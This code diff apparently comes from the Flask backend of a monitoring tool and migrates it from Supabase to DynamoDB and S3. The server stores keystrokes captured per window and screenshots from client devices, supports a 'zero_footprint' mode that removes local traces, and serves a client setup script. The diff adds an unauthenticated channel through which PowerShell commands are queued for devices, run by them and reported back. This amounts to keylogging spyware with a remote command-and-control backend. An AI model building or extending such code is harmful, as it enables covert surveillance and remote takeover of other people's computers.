+                        ExpressionAttributeValues={":did": device_id}
+                    )
+                else:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                        ExpressionAttributeValues={
+                            ":did": device_id,
+                            ":start": f"{start_date} 00:00:00#",
+                            ":end": f"{end_date} 23:59:59#~"
+                        }
+                    )
+                items = res.get("Items", [])
+                deleted_count = len(items)
+                
+                # Delete screenshots from S3
+                s3_keys = [it["screenshot_filename"] for it in items if it.get("screenshot_filename")]
+                if s3_keys and s3_client and S3_BUCKET:
+                    for i in range(0, len(s3_keys), 1000):
+                        batch = s3_keys[i:i+1000]
+                        try:
+                            s3_client.delete_objects(
+                                Bucket=S3_BUCKET,
+                                Delete={"Objects": [{"Key": k} for k in batch]}
+                            )
+                        except Exception:
+                            pass
+                            
+                # Delete items from DynamoDB
+                with logs_tbl.batch_writer() as batch:
+                    for it in items:
+                        batch.delete_item(Key={"device_id": device_id, "timestamp_id": it["timestamp_id"]})
             except Exception as e:
-                print(f"Failed to purge date range from Supabase: {e}")
+                print(f"Failed to purge date range from DynamoDB: {e}")
                 
         return jsonify({"status": "success", "deleted_count": deleted_count}), 200
     except Exception as e:
@@ -2386,16 +2716,12 @@ def get_device_config():
     if not device_id:
         return jsonify({"error": "Device ID required"}), 400
         
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            res = supabase.table("activity_logs") \
-                .select("typed_text") \
-                .eq("device_id", device_id) \
-                .eq("window_title", "__DEVICE_CONFIG__") \
-                .limit(1) \
-                .execute()
-            if res.data:
-                config = json.loads(res.data[0].get("typed_text", "{}"))
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            if "Item" in res and "config" in res["Item"]:
+                cfg = res["Item"]["config"]
+                config = json.loads(cfg) if isinstance(cfg, str) else cfg
                 return jsonify(config), 200
         except Exception as e:
             print(f"Failed to fetch device config: {e}")
@@ -2411,49 +2737,32 @@ def get_device_config():
 
 @app.route('/api/devices/config', methods=['POST'])
 def save_device_config():
-    data = request.json
+    data = request.json or {}
     device_id = data.get("device_id")
-    is_disabled = data.get("is_disabled", False)
-    disable_mouse_clicks = data.get("disable_mouse_clicks", False)
-    periodic_screenshot_interval = int(data.get("periodic_screenshot_interval", 300))
-    zero_footprint = data.get("zero_footprint", False)
-    idle_threshold = int(data.get("idle_threshold", 300))
-    
     if not device_id:
         return jsonify({"error": "Device ID required"}), 400
         
     config = {
-        "is_disabled": is_disabled,
-        "disable_mouse_clicks": disable_mouse_clicks,
-        "periodic_screenshot_interval": periodic_screenshot_interval,
-        "zero_footprint": zero_footprint,
-        "idle_threshold": idle_threshold,
-        "only_capture_on_switch": only_capture_on_switch
+        "is_disabled": data.get("is_disabled", False),
+        "disable_mouse_clicks": data.get("disable_mouse_clicks", False),
+        "periodic_screenshot_interval": int(data.get("periodic_screenshot_interval", 300)),
+        "zero_footprint": data.get("zero_footprint", False),
+        "idle_threshold": int(data.get("idle_threshold", 300)),
+        "only_capture_on_switch": data.get("only_capture_on_switch", False)
     }
     
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            # 1. Clean up old configuration records for this device
-            supabase.table("activity_logs") \
-                .delete() \
-                .eq("device_id", device_id) \
-                .eq("window_title", "__DEVICE_CONFIG__") \
-                .execute()
-                
-            # 2. Insert new configuration record
-            supabase.table("activity_logs").insert({
-                "device_id": device_id,
-                "window_title": "__DEVICE_CONFIG__",
-                "typed_text": json.dumps(config),
-                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
-                "created_date": datetime.now().strftime("%Y-%m-%d")
-            }).execute()
-            
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET config = :cfg",
+                ExpressionAttributeValues={":cfg": json.dumps(config)}
+            )
             return jsonify({"status": "success"}), 200
         except Exception as e:
             return jsonify({"error": str(e)}), 500
             
-    return jsonify({"error": "Supabase not configured"}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
 
 @app.route('/api/devices/sync-status', methods=['GET'])
 def get_device_sync_status():
@@ -2461,33 +2770,21 @@ def get_device_sync_status():
     if not device_id:
         return jsonify({"error": "Device ID required"}), 400
         
-    if supabase is not None:
+    if devices_tbl is not None:
         try:
-            # 1. Fetch desired config
-            config_res = supabase.table("activity_logs") \
-                .select("typed_text") \
-                .eq("device_id", device_id) \
-                .eq("window_title", "__DEVICE_CONFIG__") \
-                .limit(1) \
-                .execute()
-            
-            # 2. Fetch actual sync status
-            sync_res = supabase.table("activity_logs") \
-                .select("typed_text") \
-                .eq("device_id", device_id) \
-                .eq("window_title", "__CLIENT_SYNC_STATUS__") \
-                .limit(1) \
-                .execute()
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            item = res.get("Item", {})
+            desired = {}
+            if "config" in item:
+                cfg = item["config"]
+                desired = json.loads(cfg) if isinstance(cfg, str) else cfg
+            actual = {}
+            if "sync_status" in item:
+                st = item["sync_status"]
+                actual = json.loads(st) if isinstance(st, str) else st
                 
-            desired = json.loads(config_res.data[0].get("typed_text", "{}")) if config_res.data else {}
-            actual = json.loads(sync_res.data[0].get("typed_text", "{}")) if sync_res.data else {}
-            
-            # Remove synced_at timestamp to compare settings equality
             synced_at = actual.pop("synced_at", None)
-            
-            # If they don't match, or desired is defined but actual is empty, they are out of sync
             is_synced = (desired == actual) if (desired or actual) else True
-            
             return jsonify({
                 "is_synced": is_synced,
                 "synced_at": synced_at,
@@ -2498,26 +2795,28 @@ def get_device_sync_status():
             print(f"Failed to fetch sync status: {e}")
             
     return jsonify({"is_synced": True, "synced_at": None}), 200
-            
-    return jsonify({"error": "Supabase not connected"}), 400
 
 @app.route('/api/dates')
 def get_available_dates():
     dates = set()
     device_id = request.args.get("device_id")
     
-    # Try querying Supabase
-    if supabase is not None:
+    if logs_tbl is not None:
         try:
-            query = supabase.table("activity_logs").select("created_date")
             if device_id:
-                query = query.eq("device_id", device_id)
-            res = query.execute()
-            if res.data:
-                for row in res.data:
-                    dates.add(row["created_date"])
+                res = logs_tbl.query(
+                    KeyConditionExpression="device_id = :did",
+                    ExpressionAttributeValues={":did": device_id},
+                    ProjectionExpression="created_date"
+                )
+            else:
+                res = logs_tbl.scan(ProjectionExpression="created_date")
+            for item in res.get("Items", []):
+                cd = item.get("created_date")
+                if cd:
+                    dates.add(cd)
         except Exception as e:
-            print(f"Failed to query dates from Supabase: {e}")
+            print(f"Failed to query dates from DynamoDB: {e}")
             
     # Always include local dates as backup
     if os.path.exists("logs"):
@@ -2548,44 +2847,61 @@ def get_logs():
         
     device_id = request.args.get("device_id")
     
-    # Try querying Supabase
-    if supabase is not None:
+    if logs_tbl is not None:
         try:
-            query = supabase.table("activity_logs") \
-                .select("timestamp, window_title, typed_text, screenshot_url, screenshot_filename") \
-                .neq("window_title", "__DEVICE_CONFIG__")
-            
-            if not all_time:
-                query = query.gte("created_date", start_date).lte("created_date", end_date)
-            
+            items = []
             if device_id:
-                query = query.eq("device_id", device_id)
-                
-            res = query.order("timestamp", desc=False).execute()
-                
+                if all_time:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did",
+                        ExpressionAttributeValues={":did": device_id}
+                    )
+                else:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                        ExpressionAttributeValues={
+                            ":did": device_id,
+                            ":start": f"{start_date} 00:00:00#",
+                            ":end": f"{end_date} 23:59:59#~"
+                        }
+                    )
+                items = res.get("Items", [])
+            else:
+                dev_res = devices_tbl.scan(ProjectionExpression="device_id") if devices_tbl else {}
+                for d in dev_res.get("Items", []):
+                    did = d["device_id"]
+                    if all_time:
+                        q_res = logs_tbl.query(KeyConditionExpression="device_id = :did", ExpressionAttributeValues={":did": did})
+                    else:
+                        q_res = logs_tbl.query(
+                            KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                            ExpressionAttributeValues={
+                                ":did": did,
+                                ":start": f"{start_date} 00:00:00#",
+                                ":end": f"{end_date} 23:59:59#~"
+                            }
+                        )
+                    items.extend(q_res.get("Items", []))
+                    
+            items.sort(key=lambda x: x.get("timestamp", ""))
             logs = []
-            for row in res.data:
-                screenshot_filename = row["screenshot_filename"]
-                screenshot_url = row["screenshot_url"]
+            for row in items:
+                screenshot_filename = row.get("screenshot_filename")
+                screenshot_url = row.get("screenshot_url")
                 
-                # Dynamically generate a temporary signed URL if the bucket is private
-                if screenshot_filename and supabase is not None:
-                    try:
-                        signed_res = supabase.storage.from_(SUPABASE_BUCKET).create_signed_url(screenshot_filename, 3600)
-                        screenshot_url = signed_res.get("signedURL") or signed_res.get("signedUrl") or screenshot_url
-                    except Exception as e:
-                        print(f"Error signing URL: {e}")
-                        
+                if screenshot_filename and s3_client and S3_BUCKET:
+                    screenshot_url = get_screenshot_signed_url(screenshot_filename) or screenshot_url
+                    
                 logs.append({
-                    "timestamp": row["timestamp"],
-                    "window": row["window_title"],
-                    "text": row["typed_text"],
+                    "timestamp": row.get("timestamp"),
+                    "window": row.get("window_title"),
+                    "text": row.get("typed_text"),
                     "screenshot": screenshot_url,
                     "screenshot_filename": screenshot_filename
                 })
             return jsonify(logs)
         except Exception as e:
-            print(f"Failed to query logs from Supabase: {e}")
+            print(f"Failed to query logs from DynamoDB: {e}")
             
     # Fallback to local files
     return jsonify(parse_logs(start_date))
@@ -2603,45 +2919,58 @@ def get_screenshots():
         
     device_id = request.args.get("device_id")
     
-    # Try querying Supabase
-    if supabase is not None:
+    if logs_tbl is not None:
         try:
-            query = supabase.table("activity_logs") \
-                .select("timestamp, window_title, screenshot_url, screenshot_filename") \
-                .neq("window_title", "__DEVICE_CONFIG__")
-                
-            if not all_time:
-                query = query.gte("created_date", start_date).lte("created_date", end_date)
-                
-            query = query.not_.is_("screenshot_url", "null")
-            
+            items = []
             if device_id:
-                query = query.eq("device_id", device_id)
-                
-            res = query.order("timestamp", desc=False).execute()
-                
+                if all_time:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did",
+                        ExpressionAttributeValues={":did": device_id}
+                    )
+                else:
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                        ExpressionAttributeValues={
+                            ":did": device_id,
+                            ":start": f"{start_date} 00:00:00#",
+                            ":end": f"{end_date} 23:59:59#~"
+                        }
+                    )
+                items = res.get("Items", [])
+            else:
+                dev_res = devices_tbl.scan(ProjectionExpression="device_id") if devices_tbl else {}
+                for d in dev_res.get("Items", []):
+                    did = d["device_id"]
+                    if all_time:
+                        q_res = logs_tbl.query(KeyConditionExpression="device_id = :did", ExpressionAttributeValues={":did": did})
+                    else:
+                        q_res = logs_tbl.query(
+                            KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                            ExpressionAttributeValues={
+                                ":did": did,
+                                ":start": f"{start_date} 00:00:00#",
+                                ":end": f"{end_date} 23:59:59#~"
+                            }
+                        )
+                    items.extend(q_res.get("Items", []))
+                    
             screenshot_list = []
-            for row in res.data:
-                screenshot_filename = row["screenshot_filename"]
-                screenshot_url = row["screenshot_url"]
-                
-                # Dynamically generate a temporary signed URL if the bucket is private
-                if screenshot_filename and supabase is not None:
-                    try:
-                        signed_res = supabase.storage.from_(SUPABASE_BUCKET).create_signed_url(screenshot_filename, 3600)
-                        screenshot_url = signed_res.get("signedURL") or signed_res.get("signedUrl") or screenshot_url
-                    except Exception as e:
-                        print(f"Error signing URL: {e}")
-                        
+            for row in items:
+                screenshot_filename = row.get("screenshot_filename")
+                if not screenshot_filename:
+                    continue
+                signed_url = get_screenshot_signed_url(screenshot_filename)
                 screenshot_list.append({
                     "filename": screenshot_filename,
-                    "url": screenshot_url,
-                    "time": row["timestamp"],
-                    "window": row["window_title"]
+                    "url": signed_url,
+                    "time": row.get("timestamp"),
+                    "window": row.get("window_title")
                 })
+            screenshot_list.sort(key=lambda s: s["time"])
             return jsonify(screenshot_list)
         except Exception as e:
-            print(f"Failed to query screenshots from Supabase: {e}")
+            print(f"Failed to query screenshots from DynamoDB: {e}")
             
     # Fallback to local files
     screenshot_dir = os.path.join("screenshots", start_date)
@@ -2681,21 +3010,13 @@ def delete_screenshot(filename):
     if '..' in filename:
         return jsonify({"error": "Invalid filename"}), 400
         
-    supabase_deleted = False
-    if supabase is not None and SUPABASE_BUCKET:
+    s3_deleted = False
+    if s3_client is not None and S3_BUCKET:
         try:
-            # Delete from Supabase Storage
-            supabase.storage.from_(SUPABASE_BUCKET).remove([filename])
-            
-            # Nullify log entry in Supabase DB
-            supabase.table("activity_logs") \
-                .update({"screenshot_url": None, "screenshot_filename": None}) \
-                .eq("screenshot_filename", filename) \
-                .execute()
-                
-            supabase_deleted = True
+            s3_client.delete_object(Bucket=S3_BUCKET, Key=filename)
+            s3_deleted = True
         except Exception as e:
-            print(f"Failed to delete screenshot from Supabase: {e}")
+            print(f"Failed to delete screenshot from S3: {e}")
             
     # Try deleting locally
     local_path = os.path.join("screenshots", filename)
@@ -2707,7 +3028,7 @@ def delete_screenshot(filename):
         except Exception:
             pass
             
-    if supabase_deleted or local_deleted:
+    if s3_deleted or local_deleted:
         return jsonify({"status": "success"}), 200
         
     return jsonify({"error": "File not found or deletion failed"}), 404
@@ -2715,26 +3036,22 @@ def delete_screenshot(filename):
 @app.route('/api/screenshots/bulk-delete', methods=['POST'])
 def bulk_delete_screenshots():
     try:
-        data = request.json
+        data = request.json or {}
         filenames = data.get("filenames", [])
         
-        # 1. Delete from Supabase
-        if supabase is not None and SUPABASE_BUCKET and filenames:
+        # 1. Delete from S3
+        if s3_client is not None and S3_BUCKET and filenames:
             try:
-                # Remove from storage
-                supabase.storage.from_(SUPABASE_BUCKET).remove(filenames)
-                
-                # Nullify in database
-                for filename in filenames:
-                    supabase.table("activity_logs") \
-                        .update({"screenshot_url": None, "screenshot_filename": None}) \
-                        .eq("screenshot_filename", filename) \
-                        .execute()
+                for i in range(0, len(filenames), 1000):
+                    batch = filenames[i:i+1000]
+                    s3_client.delete_objects(
+                        Bucket=S3_BUCKET,
+                        Delete={"Objects": [{"Key": k} for k in batch]}
+                    )
             except Exception as e:
-                print(f"Failed to bulk delete screenshots from Supabase: {e}")
+                print(f"Failed to bulk delete screenshots from S3: {e}")
                 
         # 2. Delete local files
-        success_count = 0
         for filename in filenames:
             if '..' in filename:
                 continue
@@ -2742,7 +3059,6 @@ def bulk_delete_screenshots():
             if os.path.exists(path):
                 try:
                     os.remove(path)
-                    success_count += 1
                 except Exception:
                     pass
         return jsonify({"status": "success", "deleted": len(filenames)}), 200
@@ -2752,10 +3068,11 @@ def bulk_delete_screenshots():
 @app.route('/api/logs', methods=['DELETE'])
 def delete_log():
     try:
-        data = request.json
+        data = request.json or {}
         timestamp = data.get("timestamp")
         text = data.get("text")
         date_str = data.get("date")
+        device_id = data.get("device_id") or get_device_id()
         if not timestamp:
             return jsonify({"error": "Timestamp required"}), 400
             
@@ -2763,33 +3080,29 @@ def delete_log():
         if text:
             text = html.unescape(text).replace("\\'", "'")
             
-        # Try deleting from Supabase
-        if supabase is not None:
+        # Try deleting from DynamoDB
+        if logs_tbl is not None:
             try:
-                # Get the screenshot file to delete from Storage first
-                res = supabase.table("activity_logs") \
-                    .select("screenshot_filename") \
-                    .eq("timestamp", timestamp) \
-                    .eq("typed_text", text) \
-                    .execute()
-                    
-                if res.data:
-                    for row in res.data:
-                        screenshot_file = row.get("screenshot_filename")
-                        if screenshot_file and SUPABASE_BUCKET:
+                date_part = timestamp.split(" ")[0] if " " in timestamp else ""
+                res = logs_tbl.query(
+                    KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                    ExpressionAttributeValues={
+                        ":did": device_id,
+                        ":start": f"{date_part} 00:00:00#",
+                        ":end": f"{date_part} 23:59:59#~"
+                    }
+                )
+                for item in res.get("Items", []):
+                    if item.get("timestamp") == timestamp and item.get("typed_text") == text:
+                        sf = item.get("screenshot_filename")
+                        if sf and s3_client and S3_BUCKET:
                             try:
-                                supabase.storage.from_(SUPABASE_BUCKET).remove([screenshot_file])
+                                s3_client.delete_object(Bucket=S3_BUCKET, Key=sf)
                             except Exception:
                                 pass
-                                
-                # Delete from DB
-                supabase.table("activity_logs") \
-                    .delete() \
-                    .eq("timestamp", timestamp) \
-                    .eq("typed_text", text) \
-                    .execute()
+                        logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": item["timestamp_id"]})
             except Exception as e:
-                print(f"Failed to delete log from Supabase: {e}")
+                print(f"Failed to delete log from DynamoDB: {e}")
                 
         # Fallback to local logs deletion
         log_files = []
@@ -2832,51 +3145,41 @@ def delete_log():
 @app.route('/api/logs/bulk-delete', methods=['POST'])
 def bulk_delete_logs():
     try:
-        data = request.json
+        data = request.json or {}
         targets = data.get("logs", [])
         date_str = data.get("date")
+        device_id = data.get("device_id") or get_device_id()
         if not targets:
             return jsonify({"error": "Logs required"}), 400
             
-        # Delete from Supabase in batch
-        if supabase is not None and targets:
+        # Delete from DynamoDB
+        if logs_tbl is not None:
             try:
-                # Extract arrays for batched matching
-                timestamps = [t.get("timestamp") for t in targets if t.get("timestamp")]
-                texts = [t.get("text") for t in targets if t.get("text")]
-                
-                if timestamps and texts:
-                    # Query all matching screenshot filenames at once
-                    res = supabase.table("activity_logs") \
-                        .select("screenshot_filename") \
-                        .in_("timestamp", timestamps) \
-                        .in_("typed_text", texts) \
-                        .execute()
-                        
-                    if res.data:
-                        screenshot_files = [
-                            row.get("screenshot_filename")
-                            for row in res.data
-                            if row.get("screenshot_filename")
-                        ]
-                        
-                        # Batch delete from Supabase storage (max 100 at a time)
-                        if screenshot_files and SUPABASE_BUCKET:
-                            for i in range(0, len(screenshot_files), 100):
-                                batch = screenshot_files[i:i+100]
+                for target in targets:
+                    ts = target.get("timestamp")
+                    txt = target.get("text")
+                    if not ts:
+                        continue
+                    date_part = ts.split(" ")[0] if " " in ts else ""
+                    res = logs_tbl.query(
+                        KeyConditionExpression="device_id = :did AND timestamp_id BETWEEN :start AND :end",
+                        ExpressionAttributeValues={
+                            ":did": device_id,
+                            ":start": f"{date_part} 00:00:00#",
+                            ":end": f"{date_part} 23:59:59#~"
+                        }
+                    )
+                    for item in res.get("Items", []):
+                        if item.get("timestamp") == ts and (not txt or item.get("typed_text") == txt):
+                            sf = item.get("screenshot_filename")
+                            if sf and s3_client and S3_BUCKET:
                                 try:
-                                    supabase.storage.from_(SUPABASE_BUCKET).remove(batch)
+                                    s3_client.delete_object(Bucket=S3_BUCKET, Key=sf)
                                 except Exception:
                                     pass
-                                    
-                    # Batch delete rows
-                    supabase.table("activity_logs") \
-                        .delete() \
-                        .in_("timestamp", timestamps) \
-                        .in_("typed_text", texts) \
-                        .execute()
+                            logs_tbl.delete_item(Key={"device_id": device_id, "timestamp_id": item["timestamp_id"]})
             except Exception as e:
-                print(f"Failed to bulk delete logs from Supabase: {e}")
+                print(f"Failed to bulk delete logs from DynamoDB: {e}")
                 
         # Delete from local files (one read and write pass per file)
         log_files = []
@@ -2942,6 +3245,250 @@ def get_client_watchdog_update():
         return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
     except Exception as e:
         return str(e), 500
+
+@app.route('/api/client/update/setup_client.ps1', methods=['GET'])
+def get_client_setup_script():
+    try:
+        with open("setup_client.ps1", "r", encoding="utf-8") as f:
+            code = f.read()
+        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
+    except Exception as e:
+        return str(e), 500
+
+# ==================== CLIENT HTTP PROXY ENDPOINTS (FOR CLIENTS) ====================
+@app.route('/api/client/register', methods=['POST'])
+def client_register():
+    data = request.json or {}
+    device_id = data.get("device_id")
+    hostname = data.get("hostname", "Unknown Device")
+    now_iso = data.get("last_active") or datetime.now(timezone.utc).isoformat()
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET last_active = :la, nickname = if_not_exists(nickname, :hn)",
+                ExpressionAttributeValues={":la": now_iso, ":hn": hostname}
+            )
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"status": "no_op"}), 200
+
+@app.route('/api/client/config', methods=['GET'])
+def client_get_config():
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            if "Item" in res and "config" in res["Item"]:
+                cfg = res["Item"]["config"]
+                return jsonify(json.loads(cfg) if isinstance(cfg, str) else cfg), 200
+        except Exception:
+            pass
+    return jsonify({
+        "is_disabled": False,
+        "disable_mouse_clicks": False,
+        "periodic_screenshot_interval": 300,
+        "zero_footprint": False,
+        "idle_threshold": 300,
+        "only_capture_on_switch": False
+    }), 200
+
+@app.route('/api/client/sync-status', methods=['POST'])
+def client_post_sync_status():
+    data = request.json or {}
+    device_id = data.get("device_id")
+    sync_status = data.get("sync_status", {})
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET sync_status = :ss",
+                ExpressionAttributeValues={":ss": json.dumps(sync_status)}
+            )
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"status": "no_op"}), 200
+
+@app.route('/api/client/screenshot', methods=['POST'])
+def client_upload_screenshot():
+    data = request.json or {}
+    s3_path = data.get("s3_path")
+    image_b64 = data.get("image_b64")
+    content_type = data.get("content_type", "image/webp")
+    if not s3_path or not image_b64:
+        return jsonify({"error": "s3_path and image_b64 required"}), 400
+    if s3_client is not None and S3_BUCKET:
+        try:
+            img_bytes = base64.b64decode(image_b64)
+            s3_client.put_object(
+                Bucket=S3_BUCKET,
+                Key=s3_path,
+                Body=img_bytes,
+                ContentType=content_type
+            )
+            signed_url = get_screenshot_signed_url(s3_path)
+            return jsonify({"status": "success", "screenshot_url": signed_url, "s3_path": s3_path}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "S3 not configured"}), 500
+
+@app.route('/api/client/command/poll', methods=['GET'])
+def client_poll_command():
+    """Client polls this endpoint to get a pending PS command to execute."""
+    device_id = request.args.get("device_id")
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            item = res.get("Item", {})
+            cmd_data = item.get("pending_command")
+            if cmd_data:
+                cmd_obj = json.loads(cmd_data) if isinstance(cmd_data, str) else cmd_data
+                # Only return if not already acknowledged by this poll
+                if cmd_obj.get("status") == "pending":
+                    # Mark as dispatched so we don't re-send
+                    cmd_obj["status"] = "dispatched"
+                    devices_tbl.update_item(
+                        Key={"device_id": device_id},
+                        UpdateExpression="SET pending_command = :pc",
+                        ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
+                    )
+                    return jsonify({"has_command": True, "command_id": cmd_obj["command_id"], "command": cmd_obj["command"]}), 200
+        except Exception as e:
+            print(f"Error polling command: {e}")
+    return jsonify({"has_command": False}), 200
+
+@app.route('/api/client/command/result', methods=['POST'])
+def client_post_command_result():
+    """Client posts the PS command output back to the server."""
+    data = request.json or {}
+    device_id = data.get("device_id")
+    command_id = data.get("command_id")
+    output = data.get("output", "")
+    exit_code = data.get("exit_code", 0)
+    if not device_id or not command_id:
+        return jsonify({"error": "device_id and command_id required"}), 400
+    if devices_tbl is not None:
+        try:
+            result_obj = {
+                "command_id": command_id,
+                "output": output[:8000],  # Cap at 8KB to stay within DynamoDB limits
+                "exit_code": exit_code,
+                "completed_at": datetime.now(timezone.utc).isoformat(),
+                "status": "completed"
+            }
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET completed_command = :cc, pending_command = :pc",
+                ExpressionAttributeValues={
+                    ":cc": json.dumps(result_obj),
+                    ":pc": json.dumps({"status": "idle"})
+                }
+            )
+            return jsonify({"status": "success"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
+@app.route('/api/devices/command', methods=['POST'])
+def dispatch_command():
+    """Dashboard sends a PS command to a device."""
+    data = request.json or {}
+    device_id = data.get("device_id")
+    command = data.get("command", "").strip()
+    if not device_id or not command:
+        return jsonify({"error": "device_id and command required"}), 400
+    if devices_tbl is not None:
+        try:
+            command_id = str(uuid.uuid4())
+            cmd_obj = {
+                "command_id": command_id,
+                "command": command,
+                "status": "pending",
+                "dispatched_at": datetime.now(timezone.utc).isoformat()
+            }
+            devices_tbl.update_item(
+                Key={"device_id": device_id},
+                UpdateExpression="SET pending_command = :pc",
+                ExpressionAttributeValues={":pc": json.dumps(cmd_obj)}
+            )
+            return jsonify({"status": "dispatched", "command_id": command_id}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
+@app.route('/api/devices/command/result', methods=['GET'])
+def get_command_result():
+    """Dashboard polls for the result of a dispatched command."""
+    device_id = request.args.get("device_id")
+    command_id = request.args.get("command_id")
+    if not device_id:
+        return jsonify({"error": "Device ID required"}), 400
+    if devices_tbl is not None:
+        try:
+            res = devices_tbl.get_item(Key={"device_id": device_id})
+            item = res.get("Item", {})
+            # Check pending_command status
+            pending = item.get("pending_command")
+            pending_obj = json.loads(pending) if isinstance(pending, str) else (pending or {})
+            completed = item.get("completed_command")
+            completed_obj = json.loads(completed) if isinstance(completed, str) else (completed or {})
+            if completed_obj.get("command_id") == command_id:
+                return jsonify({"status": "completed", "result": completed_obj}), 200
+            elif pending_obj.get("command_id") == command_id:
+                return jsonify({"status": pending_obj.get("status", "pending")}), 200
+            else:
+                return jsonify({"status": "unknown"}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
+
+@app.route('/api/client/log', methods=['POST'])
+def client_write_log():
+    data = request.json or {}
+    device_id = data.get("device_id")
+    timestamp = data.get("timestamp")
+    window_title = data.get("window_title", "")
+    line_str = data.get("line_str", "")
+    screenshot_url = data.get("screenshot_url")
+    screenshot_filename = data.get("screenshot_filename")
+    
+    if not device_id or not timestamp:
+        return jsonify({"error": "device_id and timestamp required"}), 400
+        
+    if logs_tbl is not None:
+        try:
+            now_date = datetime.now().strftime("%Y-%m-%d")
+            log_uuid = str(uuid.uuid4())
+            timestamp_id = f"{timestamp}#{log_uuid[:8]}"
+            ttl_timestamp = int(time.time()) + (30 * 86400) # 30 days DynamoDB TTL auto-expire
+            
+            item = {
+                "device_id": device_id,
+                "timestamp_id": timestamp_id,
+                "id": log_uuid,
+                "timestamp": timestamp,
+                "created_date": now_date,
+                "window_title": window_title,
+                "typed_text": line_str,
+                "screenshot_url": screenshot_url or "",
+                "screenshot_filename": screenshot_filename or "",
+                "ttl": ttl_timestamp
+            }
+            logs_tbl.put_item(Item=item)
+            return jsonify({"status": "success", "id": log_uuid}), 200
+        except Exception as e:
+            return jsonify({"error": str(e)}), 500
+    return jsonify({"error": "DynamoDB not configured"}), 500
 
 current_line = []
 
@@ -3027,24 +3574,48 @@ def capture_and_upload_screenshot(prefix):
     s3_path = f"{date_str}/{filename}"
     screenshot_url = None
     
-    # 3. Upload to Supabase Storage
-    if supabase is not None and SUPABASE_BUCKET:
+    # 1. Direct S3 Upload (if boto3 S3 client is available)
+    if s3_client is not None and S3_BUCKET:
         try:
-            with open(local_path, "rb") as f:
-                supabase.storage.from_(SUPABASE_BUCKET).upload(
-                    path=s3_path,
-                    file=f,
-                    file_options={"content-type": "image/webp", "x-upsert": "true"}
-                )
-            
-            # Get Public URL
-            res_url = supabase.storage.from_(SUPABASE_BUCKET).get_public_url(s3_path)
-            screenshot_url = res_url
+            s3_client.upload_file(
+                local_path,
+                S3_BUCKET,
+                s3_path,
+                ExtraArgs={"ContentType": "image/webp"}
+            )
+            screenshot_url = get_screenshot_signed_url(s3_path) or f"screenshots/{date_str}/{filename}"
         except Exception as e:
-            print(f"Failed to upload screenshot to Supabase Storage: {e}")
+            print(f"Failed to upload screenshot to S3: {e}")
             screenshot_url = f"screenshots/{date_str}/{filename}"
         finally:
-            # Delete local temp file immediately to save disk space
+            try:
+                if os.path.exists(local_path):
+                    os.remove(local_path)
+            except Exception:
+                pass
+    # 2. HTTP Upload to AWS Central Server (client mode without AWS keys)
+    elif RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL"):
+        try:
+            server_url = RENDER_SERVER_URL or os.getenv("RENDER_SERVER_URL")
+            with open(local_path, "rb") as sf:
+                img_bytes = sf.read()
+            payload = {
+                "s3_path": s3_path,
+                "image_b64": base64.b64encode(img_bytes).decode('ascii'),
+                "content_type": "image/webp"
+            }
+            req = urllib.request.Request(
+                f"{server_url.rstrip('/')}/api/client/screenshot",
+                data=json.dumps(payload).encode('utf-8'),
+                headers={"Content-Type": "application/json"}
+            )
+            with urllib.request.urlopen(req, timeout=15) as r:
+                res_data = json.loads(r.read().decode('utf-8'))
+                screenshot_url = res_data.get("screenshot_url")
+        except Exception as se:
+            print(f"Failed to upload screenshot to central server: {se}")
+            screenshot_url = f"screenshots/{date_str}/{filename}"
+        finally:
             try:
                 if os.path.exists(local_path):
                     os.remove(local_path)
@@ -3053,7 +3624,6 @@ def capture_and_upload_screenshot(prefix):
     else:
         screenshot_url = f"screenshots/{date_str}/{filename}"
         if zero_footprint:
-            # If zero footprint is enabled, do not keep local screenshot backup
             try:
                 if os.path.exists(local_path):
                     os.remove(local_path)
